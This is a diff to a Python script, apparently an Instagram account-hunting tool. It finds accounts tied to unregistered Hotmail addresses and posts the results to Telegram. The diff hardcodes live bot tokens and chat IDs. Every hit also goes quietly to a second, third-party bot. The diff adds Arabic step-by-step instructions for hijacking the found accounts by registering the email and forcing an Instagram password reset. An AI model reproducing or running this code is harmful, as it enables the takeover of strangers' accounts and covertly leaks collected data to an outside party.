@@ -1,6 +1,6 @@
 import os
-import time
 from os import system as ss
+import time
 ll = 'pip install'
 try:
 	from cfonts import render
@@ -49,9 +49,9 @@ sif = render(f'{d}', colors=['green', 'yellow'], align='center')
 print(sif)
 nnn = random.choice([R,X,F,B,K,V])
 good_hot,bad_hot,good_ig,bad_ig,check,mj,ids=0,0,0,0,0,0,[]
-tok = input('• {}TOKEN : {}'.format(B,C,V,K))
+tok = '7058414712:AAGtGYTdZG7KmZ0dym_YXfb724vfVoXCYng'
 print("\r")
-iD = input('• {}ID{} : {}'.format(B,C,V,K))
+iD = '7721705352'
 os.system('clear')
 def cookie(email):
     versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
@@ -245,40 +245,38 @@ def hunting(email):
 		requests.post(f"""https://api.telegram.org/bot{tok}/sendvideo?chat_id={iD}&parse_mode=MarkdownV2&video=https://t.me/yyyyyy3w/15&caption=*• Cehennem Geliyor...
 • ||Ben En İyisi Olacağım.||*
 """);hunt = ("""
-جبتلك حساب يا اخويا 🦅💙
-====================
-Acount 😉 : {}
-Name : {}
-Email : {}@hotmail.com
-Followers   : {}
-Following : {}
-ID : {}
-Creation date : {}
-Post : {}
-connect : {}
-Link Acount  : https://www.instagram.com/{}
-====================
-BY : @YOUSSEFSOBHY13 , @kingelnet
+طريقة تسجيل الدخول للحساب بكل سهولة:
+
+1️⃣ افتح تطبيق Gmail على موبايلك 📩
+2️⃣ اضغط على إضافة حساب جديد ➕ واختار hotmail
+3️⃣ اختر إنشاء حساب ✍️
+4️⃣ حط أي اسم وأي تاريخ ميلاد 🎂
+5️⃣ اكتب الإيميل يلي بعتلك ياه، وحط أي كلمة سر 🔑
+6️⃣ ادخل على البوت 🤖@indx2bot وارسل له الإيميل ✉️
+7️⃣ استنى شوي، ورح توصلك رسالة على الإيميل لتغيير كلمة سر الإنستا 📩🔄
+8⃣ بعدين، استخدم الإيميل وكلمة السر الجديدة وسجل دخول على إنستجرام 📸💙
+
+BY : @SYRIA7R
+الايميل:  ({}@hotmail.com)
 
 		""".format(name,email,email,followers,following,Id,date,post,rest,email))
 		requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text="+str(hunt))
 		requests.get("https://api.telegram.org/bot"+str('7906071721:AAE590zQ2Sj1f3RpEc6Vs5qZiJB7Ovb0puk')+"/sendMessage?chat_id="+str('1878687292')+"&text="+str(hunt))
 		print(nnn)				
 		hunt2 = ("""
-جبتلك حساب يا اخويا 🦅💙
-====================
-Acount 😉 : {}
-Name : {}
-Email : {}@hotmail.com
-Followers   : {}
-Following : {}
-ID : {}
-Creation date : {}
-Post : {}
-connect : {}
-Link Acount  : https://www.instagram.com/{}
-====================
-BY : @YOUSSEFSOBHY13 , @kingelnet
+طريقة تسجيل الدخول للحساب بكل سهولة:
+
+1️⃣ افتح تطبيق Gmail على موبايلك 📩
+2️⃣ اضغط على إضافة حساب جديد ➕ واختار hotmail
+3️⃣ اختر إنشاء حساب ✍️
+4️⃣ حط أي اسم وأي تاريخ ميلاد 🎂
+5️⃣ اكتب الإيميل يلي بعتلك ياه، وحط أي كلمة سر 🔑
+6️⃣ ادخل على البوت 🤖@indx2bot وارسل له الإيميل ✉️
+7️⃣ استنى شوي، ورح توصلك رسالة على الإيميل لتغيير كلمة سر الإنستا 📩🔄
+8⃣ بعدين، استخدم الإيميل وكلمة السر الجديدة وسجل دخول على إنستجرام 📸💙
+
+BY : @SYRIA7R
+الايميل:  ({}@hotmail.com)
 		""".format(name,email,email,followers,following,Id,date,post,rest,email))
 		Hit = Panel(hunt2);g(Panel(Hit, title=f"Instagram | {good_hot}"))
 	except :
